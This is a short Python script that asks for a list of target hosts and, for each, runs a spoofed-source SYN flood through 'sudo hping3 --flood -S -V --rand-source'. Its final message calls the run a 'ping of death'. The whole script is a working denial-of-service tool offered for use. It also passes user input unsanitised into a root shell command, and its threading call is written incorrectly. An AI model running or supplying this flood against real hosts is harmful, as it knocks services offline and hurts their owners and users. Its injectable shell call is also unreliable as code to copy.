import os
import time
import threading as th

def singleHost(host_addr):
    print("Thread loaded for host : " + host_addr)
    os.system("sudo hping3 --flood -S -V --rand-source " + host_addr)

  
def multi2():
    hosts_count = input("Enter number of hosts to ping : ")
    time_interval = input("Interval in seconds between pinging hosts : ")
    host_list = []
    
    for host in range(int(hosts_count)):
        host_addr = input(f"Enter host address ({host + 1}): ")
        host_list.append(host_addr)
    
    
    for host in host_list:
        print("Starting process for host : " + host)
        th1 = th.Thread(target=singleHost(host))
        th1.start()
        time.sleep(int(time_interval))
        print("Finished process for host : " + host + "\n\n") 
    print("Ping of death has been completed for all hosts.")
    
